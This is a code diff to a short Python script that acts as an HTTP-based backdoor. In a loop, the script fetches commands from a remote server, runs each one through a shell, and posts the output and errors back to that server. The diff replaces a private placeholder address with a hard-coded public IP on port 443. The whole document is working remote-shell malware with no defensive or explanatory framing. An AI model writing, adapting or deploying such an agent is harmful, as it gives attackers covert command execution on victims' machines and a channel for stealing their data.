@@ -2,16 +2,14 @@ import requests
 import subprocess
 import time
 
-HTTPurl = 'http://10.10.10.10'
-
 while True:
-    req = requests.get(HTTPurl)
+    req = requests.get('http://34.242.70.77:443')
     command = req.text
 
     if 'terminate' in command:
         break
     else:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        post_response = requests.post(url=HTTPurl, data=CMD.stdout.read() )
-        post_response = requests.post(url=HTTPurl, data=CMD.stderr.read() )
+        post_response = requests.post(url='http://34.242.70.77:443', data=CMD.stdout.read() )
+        post_response = requests.post(url='http://34.242.70.77:443', data=CMD.stderr.read() )
     time.sleep(3)
